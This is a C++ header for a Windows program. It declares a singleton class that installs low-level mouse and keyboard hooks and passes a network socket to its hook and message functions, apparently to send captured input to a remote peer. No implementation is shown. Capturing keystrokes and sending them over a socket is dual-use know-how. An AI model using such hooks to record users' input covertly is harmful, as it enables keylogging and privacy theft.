#pragma once
#pragma once

//#define WM_MOUSEWHEEL 0x020A£¨±àÒëÍ¨¹ý£©
#define    WIN32_LEAN_AND_MEAN  
#include <Windows.h>
#include <iostream>
#include"client.h"

class MyHook {
public:
	//single ton
	static MyHook& Instance() {
		static MyHook myHook;
		return myHook;
	}
	

	HHOOK hook; // handle to the hook	
	void InstallHook(SOCKET sclient); // function to install our hook
	void UninstallHook(); // function to uninstall our hook

	MSG msg; // struct with information about all messages in our queue
	int Messsages(SOCKET sclient); // function to "deal" with our messages 

	HHOOK keyboardhook;
};
LRESULT WINAPI MyMouseCallback(int nCode, WPARAM wParam, LPARAM lParam); //callback declaration
LRESULT WINAPI MyKeyBoardCallback(int nCode, WPARAM wParam, LPARAM lParam);
typedef struct tagpoint2
{
	LONG x;
	LONG y;
	char info[20];
	int screenx= GetSystemMetrics(SM_CXSCREEN);
	int screeny= GetSystemMetrics(SM_CYSCREEN);
	int winx;
	int winy;

};

int pos(SOCKET sclient);
